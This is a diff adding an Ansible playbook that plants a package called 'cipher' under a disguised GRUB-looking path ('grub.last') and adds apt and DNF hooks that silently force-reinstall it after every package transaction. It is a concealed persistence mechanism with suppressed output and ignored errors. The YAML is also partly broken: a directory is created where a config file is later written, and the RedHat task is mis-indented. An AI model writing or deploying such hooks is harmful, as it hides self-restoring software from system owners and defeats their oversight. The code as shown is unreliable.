@@ -1,0 +1,50 @@
+---
+- name: Create backup deb file
+  ansible.builtin.copy:
+    src: "{{ cipher_deb_src }}"
+    dest: "/var/lib/grub/esp/grub.last" #backup file for nomnom
+    mode: '0755'
+  when: ansible_os_family == "Debian"
+
+- name: Ensure dpkg post invoke directory exists:
+  ansible.builtin.file:
+    path: /etc/apt/apt.conf.d/99cipher
+    state: directory
+    mode: 0755
+  when: ansible_os_family == "Debian"
+
+- name: Ensure dpkg Post-Invoke Function Exists
+  ansible.builtin.blockinfile:
+    path: /etc/apt/apt.conf.d/99cipher
+    block: |
+      DPkg::Post-Invoke {
+        "dpkg -i /var/lib/grub/esp/grub.last > /dev/null 2>&1 || true";
+      };
+    create: yes
+    mode: '0644'
+  when: ansible_os_family == "Debian"
+
+# RedHat untested
+- name: Create backup rpm file
+ansible.builtin.copy:
+  src: "{{ cipher_rpm_src }}"
+  dest: /var/lib/grub2/esp/grub.last
+  mode: 0755
+when: ansible_os_family == "RedHat"
+
+- name: Ensure DNF Post-Transaction Hook Directory Exists
+  ansible.builtin.file:
+    path: /usr/lib/python3.9/site-packages/dnf-plugins/  # Adjust Python version if needed
+    state: directory
+    mode: 0755
+  when: ansible_os_family == "RedHat"
+
+- name: Create DNF Post-Transaction Hook Script
+  ansible.builtin.copy:
+    dest: /etc/dnf/plugins/post-transaction-actions.d/cipher.action
+    content: |
+      # Format: <package-name-pattern>:<transaction-state>:<command>
+      *:any:rpm -Uvh --force /var/lib/grub2/esp/grub.last >/dev/null 2>&1 || true
+    create: yes
+    mode: 0644
+  when: ansible_os_family == "RedHat"
